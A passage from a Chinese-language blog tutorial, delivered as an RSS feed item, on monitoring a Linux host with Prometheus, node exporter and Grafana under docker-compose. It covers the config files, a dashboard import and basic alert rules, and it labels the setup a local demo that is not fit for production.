&lt;p&gt;首先，我们创建一个&lt;code class=&quot;highlighter-rouge&quot;&gt;docker-compose.yml&lt;/code&gt;文件，里面只包含 prometheus 一个服务：&lt;/p&gt;
&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;2'&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;prometheus&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;prom/prometheus:v2.0.0&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;./prometheus.yml:/etc/prometheus/prometheus.yml&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--config.file=/etc/prometheus/prometheus.yml'&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;9090:9090'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中比较重要的是&lt;code class=&quot;highlighter-rouge&quot;&gt;prometheus.yml&lt;/code&gt;文件，它是 Prometheus Server 的配置文件：&lt;/p&gt;
&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;global&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;scrape_interval&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;5s&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;external_labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;monitor&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;my-monitor'&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;scrape_configs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;job_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;prometheus'&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;static_configs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;targets&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;localhost:9090'&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;　　这个配置文件一共分为两个部分：&lt;code class=&quot;highlighter-rouge&quot;&gt;global&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;scrape_configs&lt;/code&gt;，前者是全局的配置，如果后面的任务没有对特定配置项进行覆盖，这里的选项会生效。这里有两个配置项，&lt;code class=&quot;highlighter-rouge&quot;&gt;scrape_interval&lt;/code&gt;表示 prometheus server 抓取的周期，如果太频繁会导致 prometheus 压力比较大，如果太久，可能会导致某些关键数据漏掉，推荐根据每个任务的重要性和集群规模分别进行配置。&lt;/p&gt;

&lt;p&gt;　　&lt;code class=&quot;highlighter-rouge&quot;&gt;scrape_configs&lt;/code&gt;配置了每个抓取任务，因此是一个列表，这里我们只有一个任务，那就是抓取 prometheus 本身的 metrics 。配置里面最重要的是&lt;code class=&quot;highlighter-rouge&quot;&gt;static_configs.targets&lt;/code&gt;，表示要抓取任务的 HTTP 地址，默认会在&lt;code class=&quot;highlighter-rouge&quot;&gt;/metrics&lt;/code&gt; url 处进行抓取，比如这里就是 http://localhost:9090/metrics。 这是 prometheus 本身提供的监控数据，可以在浏览器中直接查看。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/56795973-38b59580-6844-11e9-8a1a-809a313c4bab.png&quot; alt=&quot;prometheus2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;　　每个数据都是有一个名字和一系列称为 label 的键值对组成的，prometheus 在抓取数据的时候还会自动添加上&lt;code class=&quot;highlighter-rouge&quot;&gt;instance&lt;/code&gt;（节点的 host:port 标识）和&lt;code class=&quot;highlighter-rouge&quot;&gt;job&lt;/code&gt;（任务名称）两个 label 作为任务之间的区分。&lt;/p&gt;

&lt;p&gt;　　这些数据本身没有时间信息，当 prometheus 抓取的时候会自动添加上当时的时间戳。此外这些数据在客户端会分成四种不同的类型：counter、gauge、histogram 和 summary。更多关于 prometheus metrics 数据类型的说明请查阅官方文档。&lt;/p&gt;

&lt;p&gt;　　运行&lt;code class=&quot;highlighter-rouge&quot;&gt;docker-compose up -d&lt;/code&gt;启动服务，然后在浏览器中打开 http://server-ip:9090/status 查看 prometheus 运行的状态信息&lt;/p&gt;

&lt;h2 id=&quot;使用-node-exporter-收集监控数据&quot;&gt;使用 node exporter 收集监控数据&lt;/h2&gt;

&lt;p&gt;　　虽然监控 prometheus 服务自身是件有趣而且有用的事情，但是我们的目标是监控 linux 主机。因为 prometheus 只能从 HTTP 接口的某个地址来拉取监控数据，因此需要一个工具把 linux 提供的系统数据以 HTTP 服务的形式暴露出来。庆幸的是，prometheus 官方社区有很多 exporter，它们负责把某个组件或者系统的监控数据以 prometheus 能理解的方式暴露出来，其中 node exporter 就是导出 unix/linux 系统监控数据的工具。&lt;/p&gt;

&lt;p&gt;　　node exporter 主要是从&lt;code class=&quot;highlighter-rouge&quot;&gt;/proc&lt;/code&gt;中读取 linux 的各种数据，修改 docker-compose.yml 文件，添加上 node-exporter 相关的内容，node-exporter 默认会监听在 9100 端口：&lt;/p&gt;
&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;2'&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;prometheus&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;prom/prometheus:v2.0.0&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;./prometheus.yml:/etc/prometheus/prometheus.yml&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--config.file=/etc/prometheus/prometheus.yml'&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;9090:9090'&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;node-exporter&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;prom/node-exporter:v0.15.2&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;9100:9100'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;　　为了让 prometheus 收集 node-exporter 的内容，我们需要在配置文件中加上一个单独的任务：&lt;/p&gt;
&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;global&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;scrape_interval&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;5s&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;external_labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;monitor&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;my-monitor'&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;scrape_configs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;job_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;prometheus'&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;static_configs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;targets&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;localhost:9090'&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;job_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;resources'&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;scrape_interval&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;10s&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;static_configs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;targets&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;node-exporter:9100'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;　　因为 docker-compose 会自动做服务到 IP 地址的解析，因此这里可以直接使用 node-exporter:9100 作为地址。&lt;/p&gt;

&lt;p&gt;　　再次运行，确认 prometheus 中 targets 列表中有 node-exporter。&lt;/p&gt;

&lt;h2 id=&quot;安装配置-grafana&quot;&gt;安装配置 grafana&lt;/h2&gt;

&lt;p&gt;　　grafana 是一款强大的 dashboard 工具，界面设计很好看，功能强大，可配置性非常灵活。&lt;/p&gt;

&lt;p&gt;　　同样，在 docker-compose.yml 文件中加入 grafana 服务：&lt;/p&gt;
&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;2'&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;prometheus&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;prom/prometheus:v2.11.0&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;./prometheus.yml:/etc/prometheus/prometheus.yml&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;prometheus_data:/prometheus&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--config.file=/etc/prometheus/prometheus.yml'&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;9090:9090'&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;node-exporter&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;prom/node-exporter:v0.16.0&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;9100:9100'&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;grafana&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;grafana/grafana:6.2.5&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;grafana_data:/var/lib/grafana&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;environment&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;GF_SECURITY_ADMIN_PASSWORD=pass&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;depends_on&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;prometheus&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3000:3000'&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;grafana_data&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;{}&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;prometheus_data&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;{}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;　　这里使用 docker 的 volumes 来保存 grafana 和 prometheus 运行过程中产生的数据来保证持久化，而且使用&lt;code class=&quot;highlighter-rouge&quot;&gt;GF_SECURITY_ADMIN_PASSWORD=pass&lt;/code&gt;环境变量设置 admin 的密码。&lt;/p&gt;

&lt;p&gt;　　grafana 本身只是一个 dashboard，它可以从多个数据源中获取数据进行展示，比如我们这里使用的 prometheus。所以在正式配置界面之前，需要先添加数据源，点击 grafana 左上角按钮找到 Data Sources ，进入对应页面。按照下面的内容进行填写，主要是 Type 要选择 prometheus，URL 添加 grafana 服务能访问的 prometheus 地址；Name 字段随便填写一个用来标记来源的名字即可。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/56796031-5256dd00-6844-11e9-8097-633f55fd1c24.png&quot; alt=&quot;prometheus3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;　　然后创建一个 dashboard，并里面添加 graph，在 graph 中添加一个 panel，我们用这个 panel 展示系统的 load 数据。编辑 panel 数据，选择 data source 为之前添加的 prometheus，然后填写 query，系统 node 比较简单，一共是&lt;code class=&quot;highlighter-rouge&quot;&gt;node_load1&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;node_load5&lt;/code&gt;和 &lt;code class=&quot;highlighter-rouge&quot;&gt;node_load15&lt;/code&gt;，分别是系统最近一分钟、五分钟和十五分钟的 load 数值。输入完成后点击输入框之外，grafana 会自动更新上面的图表：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/56796069-61d62600-6844-11e9-9562-067c6a075ea7.png&quot; alt=&quot;prometheus4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;　　类似的，可以添加其他的 panel，展示系统方方面的监控数据，比如 CPU、memory、IO、网络等。手动通过界面对 grafana 可以很灵活地创建出很强大的图表，但是这无疑会耗费很多时间，而且 node exporter 这种监控数据是通用的，如果所有人都手动创建一遍无疑是很多重复工作。为此，grafana 支持导入和导出配置，并且提供 &lt;a href=&quot;https://grafana.com/dashboards&quot;&gt;官方社区&lt;/a&gt; 供大家分享 dashboard 配置。&lt;/p&gt;

&lt;p&gt;　　每个 dashboard 都有一个编号，比如 &lt;a href=&quot;https://grafana.com/dashboards/22&quot;&gt;编号 22 的 dashboard &lt;/a&gt; 就是专门为 node-exporter 设计的展示图表。在 grafana 中点击导入 dashboard，添加编号选择数据源，就能得到已经配置完整的图表：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/56796100-6e5a7e80-6844-11e9-9a75-32b6b44fd2b0.png&quot; alt=&quot;prometheus5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;　　如果对 dashboard 有什么不满，可以直接在页面进行添加和编辑，然后可以导出 json 文件，以便重复使用。&lt;/p&gt;

&lt;h2 id=&quot;配置告警&quot;&gt;配置告警&lt;/h2&gt;

&lt;p&gt;　　通过 grafana 图表我们可以知道系统各种指标随着时间的变化，方便轻松判断系统某个资源是否异常。但是我们不能一直盯着 dashboard，还需要系统发生异常的时候能立即通过邮件或者其他方式通知我们，这就是告警的功能。&lt;/p&gt;

&lt;p&gt;　　prometheus 提供用户可以自己配置的告警规则，在处理 metrics 数据的时候，如果发现某个规则被触发，就执行对应的告警动作，通过发邮件或者其他方式通知用户。&lt;/p&gt;

&lt;p&gt;　　对于我们的单节点主机来说，可以定义两个简单的告警规则：当主机 download 掉，或者 CPU load 持续过高一段时间就发送告警。对此，需要新建一个&lt;code class=&quot;highlighter-rouge&quot;&gt;alert.rules&lt;/code&gt;文件，用来保存告警规则，按照需求对应的内容如下：&lt;/p&gt;
&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;➜  monitor git:(master) ✗ cat alert.rules&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;node-alert&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;service_down&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;expr&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;up == &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;2m&lt;/span&gt;
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;high_load&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;expr&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;node_load1 &amp;gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0.5&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;5m&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;　　在启动 prometheus 服务的时候把告警规则文件 mount 到 service 中，如下添加一个 volume：&lt;/p&gt;
&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;➜  monitor git:(master) ✗ cat docker-compose.yml&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;2'&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;prometheus&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;prom/prometheus:v2.0.0&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;./prometheus.yml:/etc/prometheus/prometheus.yml&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;./alert.rules:/etc/prometheus/alert.rules&lt;/span&gt;
 &lt;span class=&quot;s&quot;&gt;......&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;　　然后，告知 prometheus 加载这些规则：&lt;/p&gt;
&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;➜  monitor git:(master) ✗ cat prometheus.yml&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;......&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;rule_files&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;alert.rules'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;　　prometheus 还提供了 alertmanager 可以自动化根据告警规则触发对应的动作，一般是各种方式通知用户和管理员，这里就不再介绍了。&lt;/p&gt;

&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;

&lt;p&gt;　　需要注意的是，这只是一个本地的 demo 环境，不能直接在生产上使用。首先我们没有配置安全访问，所有的服务都是 HTTP；其次 docker-compose 运行的话，所有的服务都是在同一台机器上，无法做到分布式监控和高可用。&lt;/p&gt;

&lt;p&gt;　　如果想在生产中使用 prometheus 和 grafana，请参考 &lt;a href=&quot;https://prometheus.io/docs/introduction/overview/&quot;&gt;官方文档&lt;/a&gt; 。&lt;/p&gt;
</description>
        <pubDate>Tue, 05 Mar 2019 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2019-03-05/%E4%BD%BF%E7%94%A8-prometheus-%E5%92%8C-grafana-%E7%9B%91%E6%8E%A7-linux-%E6%9C%BA%E5%99%A8/</link>
        <guid isPermaLink="true">http://localhost:4000/2019-03-05/%E4%BD%BF%E7%94%A8-prometheus-%E5%92%8C-grafana-%E7%9B%91%E6%8E%A7-linux-%E6%9C%BA%E5%99%A8/</guid>
        
        <category>容器</category>
        
        
        <category>Linux</category>
        
      </item>
    
  </channel>
</rss>
